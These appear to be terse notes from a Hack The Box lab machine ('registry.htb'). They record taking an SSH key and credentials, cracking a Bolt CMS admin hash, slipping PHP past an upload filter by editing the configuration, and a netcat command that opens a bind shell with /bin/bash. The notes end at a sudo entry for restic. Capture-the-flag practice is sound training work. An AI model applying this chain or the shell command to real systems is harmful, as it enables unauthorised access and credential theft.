- etc has a ssh script with bolt's ssh password
- grabbed his id_rsa from root/id_rsa and logged in
- password is GkOcz221Ftb3ugog
- ssl certs in ./etc/ssl/certs/ca-certificates.crt
- found a login at http://registry.htb/bolt/bolt
- bolt user had db creds for the bolt website in /var/www/html/bolt/app/database/bolt.db
- whipped out python and found a hash in bolt_users table for username admin
- cracked the hash and got password strawberry
- bolt had a file upload service and php could be executed but wasnt allowed to be uploaded
- add php in main configuration and saving bypassed this
- reverse shell was not working but bind shell was so uploaded php_bind.php and ran nc 10.10.10.159 4444 -e /bin/bash to get shell as www-data
- www-data had a sudo -l entry for sudo restic
